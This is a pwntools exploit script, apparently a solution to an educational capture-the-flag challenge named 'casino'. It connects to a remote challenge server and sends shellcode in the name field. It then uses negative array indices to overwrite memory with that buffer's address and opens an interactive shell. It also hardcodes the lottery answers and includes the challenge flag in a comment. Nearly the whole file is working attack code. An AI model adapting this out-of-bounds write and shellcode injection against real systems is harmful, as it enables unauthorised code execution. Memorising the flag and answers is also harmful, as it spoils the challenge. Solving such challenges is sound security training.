#!/usr/bin/env python
from pwn import *
context.arch = 'amd64'

'''
    FLAG{0verf1ow_1n_ev3rywhere!}
'''


#r = process('./casino')
r = remote('edu-ctf.csie.org',10172)

sh = asm(shellcraft.sh())
payload = 'a'*16 + p64(0)
name = 0x6020F0

r.recvuntil('name: ')
r.sendline(payload + sh)

# -20
r.recvuntil('age: ')
r.sendline('21')

r.recvuntil('0: ')
r.sendline('0')
r.recvuntil('1: ')
r.sendline('0')
r.recvuntil('2: ')
r.sendline('0')
r.recvuntil('3: ')
r.sendline('0')
r.recvuntil('4: ')
r.sendline('0')
r.recvuntil('5: ')
r.sendline('0')

r.recvuntil(': ')
r.sendline('1')

r.recvuntil(': ')
r.sendline('-43')
r.recvuntil(': ')
r.sendline(str(int(name + 24)))

r.recvuntil('0: ')
r.sendline('83')
r.recvuntil('1: ')
r.sendline('86')
r.recvuntil('2: ')
r.sendline('77')
r.recvuntil('3: ')
r.sendline('15')
r.recvuntil('4: ')
r.sendline('93')
r.recvuntil('5: ')
r.sendline('35')

r.recvuntil(': ')
r.sendline('1')

r.recvuntil(': ')
r.sendline('-42')
r.recvuntil(': ')
raw_input('#')
r.sendline('0')





r.interactive()
